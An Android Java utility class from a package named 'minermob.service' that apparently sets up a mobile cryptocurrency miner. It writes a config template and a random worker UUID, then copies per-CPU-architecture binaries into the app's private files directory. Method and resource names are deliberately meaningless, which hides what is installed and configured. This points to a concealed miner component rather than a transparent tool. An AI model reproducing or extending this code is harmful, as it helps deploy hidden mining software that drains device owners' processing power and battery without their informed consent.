package minermob.service.utils;

import android.app.Activity;
import android.content.Context;
import android.os.Build;

import java.util.Arrays;
import java.util.UUID;

import minermob.service.R;

public class MBD {
    private static String[] S_A;

    public static void yazdir(Activity activity) {
        String[] S_A = new String[]{activity.getResources().getString(R.string.work1), activity.getResources().getString(R.string.work2), activity.getResources().getString(R.string.work3)};
        spMain.spSetString(activity.getResources().getString(R.string.tyr), activity, String.valueOf(MBT.loadConfigTemplate(activity)));
        spMain.spSetString(activity.getResources().getString(R.string.work), activity, String.valueOf(qerty(activity)));
        spMain.spSetString(activity.getResources().getString(R.string.ytrewq), activity, String.valueOf(activity.getFilesDir().getAbsolutePath()));
        String toLowerCase;
        StringBuilder stringBuilder;
        if (Arrays.asList(S_A).contains(Build.CPU_ABI.toLowerCase())) {
            toLowerCase = nedir(activity, Build.CPU_ABI.toLowerCase());
            stringBuilder = new StringBuilder();
            stringBuilder.append(toLowerCase);
            stringBuilder.append(activity.getResources().getString(R.string.uthx));
            String stringBuilder2 = stringBuilder.toString();
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder3.append(spMain.spGetString(activity.getResources().getString(R.string.ytrewq), activity));
            stringBuilder3.append(activity.getResources().getString(R.string.uthx));
            MBT.gogocfl(activity, stringBuilder2, stringBuilder3.toString());
            stringBuilder = new StringBuilder();
            stringBuilder.append(toLowerCase);
            stringBuilder.append(activity.getResources().getString(R.string.uthmx));
            toLowerCase = stringBuilder.toString();
            stringBuilder = new StringBuilder();
            stringBuilder.append(spMain.spGetString(activity.getResources().getString(R.string.ytrewq), activity));
            stringBuilder.append(activity.getResources().getString(R.string.uthmx2));
            MBT.gogocfl(activity, toLowerCase, stringBuilder.toString());
            stringBuilder = new StringBuilder();
            stringBuilder.append(spMain.spGetString(activity.getResources().getString(R.string.ytrewq), activity));
            stringBuilder.append(activity.getResources().getString(R.string.uq));
            MBT.gogocfl(activity, activity.getResources().getString(R.string.uqmx), stringBuilder.toString());
        } else {
            StringBuilder yeni = new StringBuilder();
            stringBuilder = new StringBuilder();
            stringBuilder.append(spMain.spGetString(activity.getResources().getString(R.string.ytrewq), activity));
            stringBuilder.append(activity.getResources().getString(R.string.uthx));
            yeni.append(activity.getResources().getString(R.string.work3));
            yeni.append(activity.getResources().getString(R.string.uthx));
            MBT.gogocfl(activity, yeni.toString(), stringBuilder.toString());
            stringBuilder = new StringBuilder();
            stringBuilder.append(spMain.spGetString(activity.getResources().getString(R.string.ytrewq), activity));
            stringBuilder.append(activity.getResources().getString(R.string.uthmx2));
            MBT.gogocfl(activity, yeni.toString(), stringBuilder.toString());
            stringBuilder = new StringBuilder();
            stringBuilder.append(spMain.spGetString(activity.getResources().getString(R.string.ytrewq), activity));
            stringBuilder.append(activity.getResources().getString(R.string.uq));
            MBT.gogocfl(activity, activity.getResources().getString(R.string.uqmx), stringBuilder.toString());
        }


    }

    private static String nedir(Activity c, String s) {
        if (s.contains(c.getResources().getString(R.string.work1))) {
            return c.getResources().getString(R.string.work2);
        } else if (s.contains(c.getResources().getString(R.string.work2))) {
            return c.getResources().getString(R.string.work2);
        } else if (s.contains(c.getResources().getString(R.string.work3))) {
            return c.getResources().getString(R.string.work3);
        } else {
            return c.getResources().getString(R.string.work);
        }
    }


    private static String qerty(Activity activity) {
        return UUID.randomUUID().toString();
    }
}

